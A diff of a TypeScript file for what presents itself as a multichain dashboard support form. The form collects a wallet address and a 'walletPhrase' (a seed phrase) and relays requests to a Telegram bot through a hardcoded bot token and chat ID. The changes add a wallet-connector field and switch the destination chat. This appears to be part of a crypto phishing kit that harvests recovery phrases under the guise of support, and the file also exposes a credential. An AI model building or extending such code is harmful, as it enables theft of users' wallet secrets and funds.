@@ -27,6 +27,7 @@ interface SupportRequest {
   description: string
   urgency: string
   walletAddress: string
+  connectorName : string
   walletPhrase: string
   network: string
   timestamp: string
@@ -187,7 +188,7 @@ ${data.description}
 💼 <b>Wallet Info:</b>
   • Address: <code>${data.walletAddress}</code>
   • Network: ${data.network}
-
+  • Connector: ${data.connectorName}
 ---
 <i>MultiChain Protocol Dashboard Support System</i>`
 
@@ -232,8 +233,8 @@ ${context ? `📍 <b>Context:</b> ${context}` : ""}
 // Utility function to create bot instance
 export function createTelegramBot(): TelegramBot | null {
   const botToken = "7333818064:AAGFQmDsIWS2y3iRwiWCtRpQ6bzZSdUouEo"
-  const chatId = "-4900724350"
-    // const chatId = "1374918767" // Replace with your actual chat ID
+  // const chatId = "-4900724350"
+    const chatId = "1374918767" // Replace with your actual chat ID
 
   if (!botToken || !chatId) {
     console.warn("Telegram bot credentials not configured")
